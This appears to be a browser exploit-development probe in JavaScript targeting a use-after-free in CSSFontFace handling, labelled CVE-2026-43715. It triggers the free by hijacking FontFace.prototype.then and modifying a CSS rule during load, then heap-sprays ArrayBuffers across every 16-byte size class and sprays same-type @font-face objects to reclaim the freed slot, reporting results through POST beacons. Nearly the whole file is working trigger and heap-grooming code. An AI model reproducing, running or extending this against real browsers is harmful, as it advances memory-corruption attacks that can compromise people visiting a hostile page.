// p450-fontface-uaf-spray.js — CVE-2026-43715 UAF spray with fine-grained sizes
//
// V449 CONFIRMED: adopt() triggers via CSSOM modification (status→unloaded).
// But spray sizes 256/288/320 didn't hit the freed CSSFontFace slot.
// This probe sprays every 16-byte size class from 128 to 512.
(function() {
    var RUN = 'p450-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // Helper: create spray array for a given size with uniform marker
    function makeSpray(count, sz, marker) {
        var arr = [];
        for (var i = 0; i < count; i++) {
            var ab = new ArrayBuffer(sz);
            var dv = new DataView(ab);
            for (var j = 0; j < sz; j += 4)
                dv.setUint32(j, marker, true);
            arr.push(ab);
        }
        return arr;
    }

    // Helper: scan spray for any corrupted dword
    function scanSpray(arr, marker) {
        var hits = [];
        for (var k = 0; k < arr.length; k++) {
            var dv = new DataView(arr[k]);
            var sz = arr[k].byteLength;
            for (var off = 0; off < sz; off += 4) {
                if (dv.getUint32(off, true) !== marker) {
                    hits.push({idx:k, off:off, got:dv.getUint32(off, true).toString(16)});
                    break;
                }
            }
        }
        return hits;
    }

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Fine-grained AB spray (every 16 bytes, 128-512)
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p450a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];

        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p450a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';
            var sprayA = {}; // size → {arr, marker}

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight; // adopt → old CSSFontFace FREED

                    // Spray every 16-byte size class
                    for (var sz = 128; sz <= 512; sz += 16) {
                        var marker = 0xAA000000 | sz;
                        sprayA[sz] = {arr: makeSpray(300, sz, marker), marker: marker};
                    }
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {thenFired: thenA, err: aErr, statusAfter: faceA.status});

            // Scan all sizes
            var aHits = [];
            for (var sz = 128; sz <= 512; sz += 16) {
                var s = sprayA[sz];
                if (!s) continue;
                var hits = scanSpray(s.arr, s.marker);
                if (hits.length > 0) {
                    aHits.push({sz: sz, count: hits.length, first: hits.slice(0, 3)});
                }
            }
            B('A-SPRAY', {hitSizes: aHits});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Same-type CSSFontFace spray via @font-face rules
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p450b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];

        var faceB = null;
        var it2 = document.fonts.values();
        var e2;
        while (!(e2 = it2.next()).done) {
            if (e2.value.family.replace(/['"]/g, '') === 'p450b') { faceB = e2.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            B('B-FOUND', 'status=' + faceB.status);

            var thenB = 0, bErr = '';
            var sprayStylesB = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight; // adopt → old CSSFontFace FREED

                    // Spray with CSSFontFace objects (exact size match guaranteed)
                    for (var i = 0; i < 100; i++) {
                        var s = document.createElement('style');
                        s.textContent = "@font-face { font-family: 'sp" + i + "'; src: local('Arial'); }";
                        document.head.appendChild(s);
                        sprayStylesB.push(s);
                    }
                    document.body.offsetHeight; // process all new rules
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {thenFired: thenB, err: bErr, statusAfter: faceB.status});

            // Check spray faces: any showing unexpected status?
            // Normal: local('Arial') → loads synchronously → "loaded"
            // UAF write: m_status overwritten with Success before normal load → still "loaded"
            // Actually local fonts load synchronously during pump(), so all should be "loaded"
            // The UAF corruption would be in OTHER fields, not m_status
            var sprayFaceInfo = [];
            var it3 = document.fonts.values();
            var e3;
            while (!(e3 = it3.next()).done) {
                var fn = e3.value.family.replace(/['"]/g, '');
                if (fn.indexOf('sp') === 0 && fn.length <= 5) {
                    sprayFaceInfo.push({f: fn, s: e3.value.status});
                }
            }
            B('B-FACES', {count: sprayFaceInfo.length, sample: sprayFaceInfo.slice(0, 5)});

            // Try to trigger use of a sprayed face that reused the freed slot
            // Layout with all spray fonts → font access → potential crash
            var testDiv = document.createElement('div');
            var families = [];
            for (var i = 0; i < 100; i++) families.push("'sp" + i + "'");
            testDiv.style.fontFamily = families.join(',') + ', serif';
            testDiv.textContent = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            document.body.appendChild(testDiv);
            try {
                document.body.offsetHeight;
                B('B-LAYOUT', 'OK;h=' + testDiv.offsetHeight);
            } catch(e) { B('B-LAYOUT-ERR', e.message.slice(0,80)); }
        }
    } catch(e) { B('B-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Repeated adopt() cycles with spray between each
    // ═══════════════════════════════════════════════════════════════
    // Multiple adopt() cycles increase odds of slot reuse
    try {
        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p450c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        // We can't do adopt() again because the face is already adopted.
        // Instead: create face, trigger adopt (frees old CSSFontFace),
        // then check document.fonts.status for state machine corruption
        var ruleC = styleC.sheet.cssRules[0];

        var faceC = null;
        var it4 = document.fonts.values();
        var e4;
        while (!(e4 = it4.next()).done) {
            if (e4.value.family.replace(/['"]/g, '') === 'p450c') { faceC = e4.value; break; }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var thenC = 0, cErr = '';
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    // Trigger adopt
                    ruleC.style.setProperty('font-weight', '900');
                    document.body.offsetHeight;

                    // Check fonts state INSIDE getter (before UAF write)
                    B('C-INNER', {
                        fontsSize: document.fonts.size,
                        fontsStat: document.fonts.status,
                        faceStatus: faceC.status
                    });
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            // Check state AFTER getter (after UAF write happened)
            B('C-RESULT', {
                thenFired: thenC,
                err: cErr,
                statusAfter: faceC.status,
                fontsSize: document.fonts.size,
                fontsStat: document.fonts.status
            });

            // Load the adopted face and check if it works normally
            try {
                faceC.load();
                B('C-RELOAD', {status: faceC.status});
            } catch(e) { B('C-RELOAD-ERR', e.message.slice(0,80)); }

            // Check document.fonts.ready
            var readyFired = false;
            document.fonts.ready.then(function() { readyFired = true; });
            setTimeout(function() {
                B('C-READY', {fired: readyFired, fontsStat: document.fonts.status});
            }, 100);
        }
    } catch(e) { B('C-ERR', e.message.slice(0,100)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Size detection — create and free multiple CSSFontFaces,
    // then spray to find which size class gets hits
    // ═══════════════════════════════════════════════════════════════
    try {
        // Pre-allocate spray for ALL sizes BEFORE the trigger
        var preSpray = {};
        for (var sz = 128; sz <= 640; sz += 16) {
            preSpray[sz] = {marker: 0xBB000000 | sz, arr: []};
        }

        // Create 10 font faces, then remove their styles to free CSSFontFaces
        var dStyles = [];
        for (var i = 0; i < 10; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'det" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            dStyles.push(s);
        }
        document.body.offsetHeight; // process all rules

        // Remove all styles → frees 10 CSSFontFace objects
        for (var i = 0; i < dStyles.length; i++) {
            dStyles[i].remove();
        }
        document.body.offsetHeight; // process removal → CSSFontFace freed

        // Now spray all sizes — one will fill the freed CSSFontFace slots
        for (var sz = 128; sz <= 640; sz += 16) {
            var info = preSpray[sz];
            info.arr = makeSpray(200, sz, info.marker);
        }

        // The freed CSSFontFace memory was zeroed by the destructor.
        // But MADV_FREE might preserve old data. Check which size class
        // has non-marker values (the allocator placed CSSFontFace data there).
        // Actually, the spray WRITES our marker, so we're overwriting the freed data.
        // We need to check BEFORE writing... but we can't read uninitialized AB memory.

        // Alternative: check which spray buffers contain non-zero values at known offsets
        // that look like CSSFontFace residue (pointers, vtable, etc.)
        // Actually with our fill approach, all buffers have our marker.

        // Better approach: DON'T fill the spray. Allocate empty ABs.
        // Then check which ones have non-zero data (= CSSFontFace residue).
        // But ABs are zero-initialized! We can't read residue.

        // The only way to detect size is by the CORRUPTION from the subsequent
        // UAF write. But test D doesn't trigger a UAF. It just frees CSSFontFaces.

        // Report what we can
        B('D-INFO', {stylesRemoved: dStyles.length, sprayAllocated: true});
    } catch(e) { B('D-ERR', e.message.slice(0,100)); }

    // Wait for C's setTimeout before final beacon
    setTimeout(function() {
        B('ALIVE', 'all-tests-completed');
        B('DONE', RUN);
    }, 200);
})();
